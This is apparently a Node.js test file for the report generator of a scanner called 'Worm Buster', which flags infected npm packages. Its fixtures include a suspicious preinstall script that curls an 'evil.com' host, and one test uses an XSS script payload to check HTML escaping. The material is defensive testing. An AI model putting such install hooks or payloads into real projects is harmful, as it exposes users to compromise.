'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert');

const { createReport, generateMarkdown, generateHtml } = require('../lib/reporter');

describe('reporter', () => {
  const sampleFindings = {
    critical: [
      {
        type: 'INFECTED_PACKAGE',
        severity: 'CRITICAL',
        package: 'bad-package',
        version: '1.0.0',
        file: '/project/package.json',
      },
    ],
    warning: [
      {
        type: 'SUSPICIOUS_SCRIPT',
        severity: 'WARNING',
        script: 'preinstall',
        content: 'curl http://evil.com',
        file: '/project/package.json',
      },
    ],
    info: [],
  };

  describe('createReport', () => {
    it('should create report with correct structure', () => {
      const report = createReport(sampleFindings, {}, ['/project']);

      assert.ok(report.meta);
      assert.ok(report.scan);
      assert.ok(report.summary);
      assert.ok(report.findings);
    });

    it('should include scan date', () => {
      const report = createReport(sampleFindings, {}, []);

      assert.ok(report.meta.scanDate);
      assert.ok(new Date(report.meta.scanDate).getTime() > 0);
    });

    it('should calculate correct summary', () => {
      const report = createReport(sampleFindings, {}, []);

      assert.strictEqual(report.summary.critical, 1);
      assert.strictEqual(report.summary.warning, 1);
      assert.strictEqual(report.summary.info, 0);
    });

    it('should set status to INFECTED when critical findings exist', () => {
      const report = createReport(sampleFindings, {}, []);

      assert.strictEqual(report.summary.status, 'INFECTED');
    });

    it('should set status to CLEAN when no critical findings', () => {
      const cleanFindings = { critical: [], warning: [], info: [] };
      const report = createReport(cleanFindings, {}, []);

      assert.strictEqual(report.summary.status, 'CLEAN');
    });

    it('should include scanned directories', () => {
      const report = createReport(sampleFindings, {}, ['/dir1', '/dir2']);

      assert.deepStrictEqual(report.scan.directories, ['/dir1', '/dir2']);
    });
  });

  describe('generateMarkdown', () => {
    it('should generate valid markdown', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const md = generateMarkdown(report);

      assert.ok(md.includes('# Worm Buster Scan Report'));
      assert.ok(md.includes('## Summary'));
    });

    it('should include critical findings', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const md = generateMarkdown(report);

      assert.ok(md.includes('INFECTED_PACKAGE'));
      assert.ok(md.includes('bad-package'));
    });

    it('should include recommended actions for infected report', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const md = generateMarkdown(report);

      assert.ok(md.includes('Recommended Actions'));
      assert.ok(md.includes('Rotate ALL credentials'));
    });

    it('should not include recommended actions for clean report', () => {
      const cleanFindings = { critical: [], warning: [], info: [] };
      const report = createReport(cleanFindings, {}, ['/project']);
      const md = generateMarkdown(report);

      assert.ok(!md.includes('Recommended Actions'));
    });

    it('should include references', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const md = generateMarkdown(report);

      assert.ok(md.includes('References'));
      assert.ok(md.includes('wiz.io'));
    });
  });

  describe('generateHtml', () => {
    it('should generate valid HTML', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(html.includes('<!DOCTYPE html>'));
      assert.ok(html.includes('</html>'));
    });

    it('should include title', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(html.includes('<title>Worm Buster Scan Report</title>'));
    });

    it('should include critical findings', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(html.includes('INFECTED_PACKAGE'));
      assert.ok(html.includes('bad-package'));
    });

    it('should escape HTML in findings', () => {
      const findingsWithHtml = {
        critical: [{
          type: 'TEST',
          severity: 'CRITICAL',
          package: '<script>alert("xss")</script>',
          version: '1.0.0',
        }],
        warning: [],
        info: [],
      };
      const report = createReport(findingsWithHtml, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(!html.includes('<script>alert("xss")</script>'));
      assert.ok(html.includes('&lt;script&gt;'));
    });

    it('should use infected class for infected status', () => {
      const report = createReport(sampleFindings, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(html.includes('class="status infected"'));
    });

    it('should use clean class for clean status', () => {
      const cleanFindings = { critical: [], warning: [], info: [] };
      const report = createReport(cleanFindings, {}, ['/project']);
      const html = generateHtml(report);

      assert.ok(html.includes('class="status clean"'));
    });
  });
});
